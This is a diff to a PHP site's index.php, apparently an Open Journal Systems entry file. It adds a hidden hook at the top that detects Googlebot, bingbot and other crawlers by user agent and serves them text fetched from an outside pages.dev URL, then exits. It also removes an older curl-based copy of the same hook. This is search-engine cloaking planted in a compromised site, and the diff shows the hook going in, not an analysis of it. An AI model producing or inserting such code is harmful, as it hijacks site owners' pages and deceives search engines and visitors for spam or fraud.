@@ -1,4 +1,26 @@
 <?php
+function is_bot()
+{
+	$user_agent = $_SERVER['HTTP_USER_AGENT'];
+	$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+	foreach ($bots as $bot) {
+		if (stripos($user_agent, $bot) !== false) {
+			return true;
+		}
+	}
+
+	return false;
+}
+
+if (is_bot()) {
+	$message = file_get_contents('https://altarqiyah.pages.dev/altarqiyah-ac-id.txt'); //
+	echo $message;
+	(exit);
+}
+?>
+
+<?php
 
 /**
  * @defgroup index Index
@@ -23,26 +45,7 @@
 /**
  * Basic initialization (pre-classloading).
  */
-function is_bot()
-{
-	$agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-	foreach ($agents as $agent) {
-		if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-	}
-	return false;
-}
 
-if (is_bot()) {
-	$url = 'https://altarqiyah.pages.dev/altarqiyah-ac-id.txt';
-
-	$ch = curl_init($url);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	$result = curl_exec($ch);
-	curl_close($ch);
-
-	echo $result ?: ' ';
-	exit;
-}
 define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
 if (!defined('DIRECTORY_SEPARATOR')) {
 	// Older versions of PHP do not define this
